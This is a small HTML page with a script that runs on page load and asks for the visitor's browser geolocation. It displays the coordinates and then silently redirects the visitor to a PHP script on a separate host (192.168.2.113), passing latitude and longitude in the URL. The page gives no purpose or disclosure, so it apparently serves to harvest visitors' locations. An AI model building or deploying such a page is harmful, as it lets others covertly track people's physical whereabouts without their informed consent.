<!DOCTYPE html>
<html>
<body>

<p id="demo"></p>

<script>
getLocation()
var x = document.getElementById("demo");

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else { 
        x.innerHTML = "Geolocation is not supported by this browser.";
    }
}

function showPosition(position) {
    x.innerHTML = "Latitude: " + position.coords.latitude + 
    "<br>Longitude: " + position.coords.longitude;
 var a = position.coords.latitude;
 var b = position.coords.longitude;
 window.location.href= " http://192.168.2.113/1.php?lat= " + a + "&lon=" + b; 

}
</script>

</body>
</html>

